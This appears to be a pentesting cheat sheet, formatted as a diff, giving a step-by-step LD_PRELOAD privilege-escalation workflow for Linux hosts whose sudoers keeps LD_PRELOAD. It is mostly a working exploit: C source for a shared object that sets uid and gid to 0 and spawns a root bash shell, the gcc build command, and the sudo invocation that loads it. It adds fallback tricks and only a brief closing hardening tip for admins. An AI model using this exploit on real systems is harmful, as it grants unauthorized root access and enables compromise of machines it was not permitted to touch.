@@ -1,0 +1,76 @@
+🧠 ITTT Workflow – LD_PRELOAD Privilege Escalation
+✅ IF:
+sudo -l reveals a binary you can run as root
+
+AND you see:
+
+makefile
+Copy
+Edit
+env_keep+=LD_PRELOAD
+AND the binary is not a known GTFOBin, so you can’t just abuse it directly
+
+👉 THEN:
+Create and inject your own shared object .so to escalate privileges.
+
+🛠️ Step-by-Step TL;DR (Write it, Build it, Hijack it)
+1. 🔍 Check sudo -l
+bash
+Copy
+Edit
+sudo -l
+Look for:
+
+env_keep+=LD_PRELOAD
+
+Something like:
+
+bash
+Copy
+Edit
+(root) NOPASSWD: /usr/sbin/apache2 restart
+2. 🧬 Write the malicious shared object
+c
+Copy
+Edit
+// root.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void _init() {
+  unsetenv("LD_PRELOAD"); // Prevent recursion
+  setgid(0);
+  setuid(0);
+  system("/bin/bash");
+}
+3. 🛠️ Compile the shared object
+bash
+Copy
+Edit
+gcc -fPIC -shared -o /tmp/root.so root.c -nostartfiles
+4. ⚠️ Exploit it with LD_PRELOAD + sudo'd binary
+bash
+Copy
+Edit
+sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
+5. 🧙 You're root!
+bash
+Copy
+Edit
+id
+# uid=0(root) gid=0(root)
+🔒 Pro Tip — If It Fails:
+If env_keep+=LD_PRELOAD isn’t in sudo -l, this method won’t work.
+
+Some binaries may drop privileges early, or LD_PRELOAD won’t affect them.
+
+If sudo drops LD_PRELOAD, you might still try LD_LIBRARY_PATH, rpath tricks, or classic GTFOBins.
+
+⚠️ Real-World Risk:
+This is a misconfiguration in /etc/sudoers. Admins should:
+
+Avoid keeping dangerous env vars like LD_PRELOAD
+
+Use full paths + limit what can be run under sudo
+
